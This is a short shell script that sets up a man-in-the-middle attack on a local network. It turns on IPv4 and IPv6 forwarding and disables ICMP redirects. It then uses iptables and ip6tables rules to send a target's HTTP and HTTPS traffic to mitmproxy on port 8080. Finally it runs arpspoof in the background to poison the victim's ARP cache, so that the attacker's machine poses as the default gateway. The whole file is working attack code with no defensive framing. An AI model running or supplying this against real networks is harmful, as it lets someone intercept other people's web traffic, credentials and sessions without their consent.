# enable traffic forwarding
# disable icmp redirects
echo "[+] enabling ipv4 forwarding..."
sysctl -w net.ipv4.ip_forward=1
sysctl -w net.ipv4.conf.all.forwarding=1
echo "[+] enable ipv6 forwarding..."
sysctl -w net.ipv6.conf.all.forwarding=1
echo "[+] disabling IGMP redirects..."
sysctl -w net.ipv4.conf.all.send_redirects=0


# reroute incoming traffic on 80 (HTTP) and 443 (HTTPS) to come in on port 8080 instead
echo "[+] rerouting incoming traffic on ports 80 & 443 to come in on 8080 (mitmproxy)..."
iptables -P FORWARD ACCEPT
iptables -P INPUT ACCEPT
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp -j REDIRECT --dport 80 --to-port 8080
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp -j REDIRECT --dport 443 --to-port 8080

ip6tables -P FORWARD ACCEPT
ip6tables -P INPUT ACCEPT
ip6tables -t nat -A PREROUTING -i $INTERFACE -p tcp -j REDIRECT --dport 80 --to-port 8080
ip6tables -t nat -A PREROUTING -i $INTERFACE -p tcp -j REDIRECT --dport 443 --to-port 8080

# convince the target we're their default gateway via ARP spoofing / cache poisoning
echo "[+] spoofing arp..."
arpspoof -i $INTERFACE -t $VICTIM_IP -r $GATEWAY_IP 2>/dev/null 1>/dev/null &
